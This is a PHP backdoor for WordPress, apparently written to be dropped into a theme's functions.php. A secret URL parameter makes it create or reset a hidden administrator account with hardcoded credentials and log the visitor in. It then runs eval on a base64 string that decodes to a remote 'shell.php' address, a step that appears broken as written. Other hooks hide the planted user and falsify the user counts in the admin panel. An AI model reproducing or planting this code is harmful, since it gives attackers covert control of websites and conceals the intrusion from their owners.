<?php
// STEALTH ACCESS - FUNCTIONS.PHP VERSION
add_action('init', 'stealth_trigger', 1);
function stealth_trigger() {
    if ( isset($_GET['campdbr']) && $_GET['campdbr'] == 'go' ) {
        
        // LOAD USER FUNCTIONS jika belum ada
        if (!function_exists('wp_create_user')) {
            require_once(ABSPATH . 'wp-includes/user.php');
            require_once(ABSPATH . 'wp-includes/pluggable.php');
            require_once(ABSPATH . 'wp-includes/capabilities.php');
        }
        
        $user_n = 'kasih';
        $user_p = 'sayang';
        $user_e = 'admin@internal-system.com';
        
        // CREATE/UPDATE ADMIN
        if ( !function_exists('username_exists') ) {
            function username_exists($username) {
                global $wpdb;
                return $wpdb->get_var($wpdb->prepare("SELECT ID FROM {$wpdb->users} WHERE user_login = %s", $username));
            }
        }
        
        $user_id = username_exists($user_n);
        if (!$user_id) {
            $user_id = wp_create_user($user_n, $user_p, $user_e);
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        } else {
            wp_set_password($user_p, $user_id);
        }
        
        // AUTO LOGIN
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true);
        
        // YOUR SHELL - ISI INI!
        eval(base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rld2E2OXJ0cC1jcmVhdG9yL2hvb2gvcmVmcy9oZWFkcy9tYWluL3NoZWxsLnBocA=='));
        exit;
    }
}

// HIDE USER
add_action('pre_user_query','stealth_hide');
function stealth_hide($user_search){
    global $wpdb;
    $user_search->query_where .= " AND {$wpdb->users}.user_login NOT IN ('kasih')";
}

// FAKE COUNT
add_filter('views_users', 'stealth_count');
function stealth_count($views) {
    foreach ($views as $role => $link) {
        $views[$role] = preg_replace('/\$(\d+)\$/', '(999)', $link);
    }
    return $views;
}
?>
